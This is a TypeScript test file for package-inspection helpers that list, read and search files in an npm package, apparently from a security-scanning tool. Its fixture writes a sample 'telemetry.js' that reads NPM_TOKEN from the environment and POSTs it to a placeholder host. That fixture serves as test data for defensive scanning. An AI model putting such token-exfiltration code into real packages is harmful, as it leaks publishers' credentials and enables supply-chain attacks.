import test from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import path from 'node:path';
import { promises as fs } from 'node:fs';

import { listPackageFiles, readPackageFile, searchInPackageFiles } from '../../src/fs-tools.ts';

async function makePackageFixture(): Promise<string> {
  const packageDir = await fs.mkdtemp(path.join(os.tmpdir(), 'openclaw-pkg-'));
  await fs.mkdir(path.join(packageDir, 'lib'), { recursive: true });
  await fs.writeFile(
    path.join(packageDir, 'package.json'),
    JSON.stringify({ name: 'fixture-pkg', version: '1.0.0' }, null, 2),
    'utf8',
  );
  await fs.writeFile(
    path.join(packageDir, 'lib', 'telemetry.js'),
    [
      "const token = process.env.NPM_TOKEN;",
      "fetch('https://example.test/collect', { method: 'POST', body: token });",
    ].join('\n'),
    'utf8',
  );
  await fs.writeFile(path.join(packageDir, 'binary.bin'), Buffer.from([1, 2, 3]));
  return packageDir;
}

test('listPackageFiles returns nested files and directories', async () => {
  const packageDir = await makePackageFixture();
  const files = await listPackageFiles(packageDir);
  const paths = files.map((file) => `${file.type}:${file.path}`).sort();

  assert.deepEqual(paths, ['dir:lib', 'file:binary.bin', 'file:lib/telemetry.js', 'file:package.json']);
});

test('readPackageFile reads text files inside the package root', async () => {
  const packageDir = await makePackageFixture();
  const contents = await readPackageFile(packageDir, 'lib/telemetry.js');

  assert.match(contents, /process\.env\.NPM_TOKEN/);
});

test('readPackageFile rejects path traversal and non-text files', async () => {
  const packageDir = await makePackageFixture();

  await assert.rejects(() => readPackageFile(packageDir, '../outside.js'), /escapes package root/);
  await assert.rejects(() => readPackageFile(packageDir, 'binary.bin'), /Refusing to read non-text file/);
});

test('searchInPackageFiles finds matching lines with file and line number', async () => {
  const packageDir = await makePackageFixture();
  const matches = await searchInPackageFiles(packageDir, 'process\\.env');

  assert.equal(matches.length, 1);
  assert.deepEqual(matches[0], {
    file: 'lib/telemetry.js',
    line: 1,
    excerpt: 'const token = process.env.NPM_TOKEN;',
  });
});
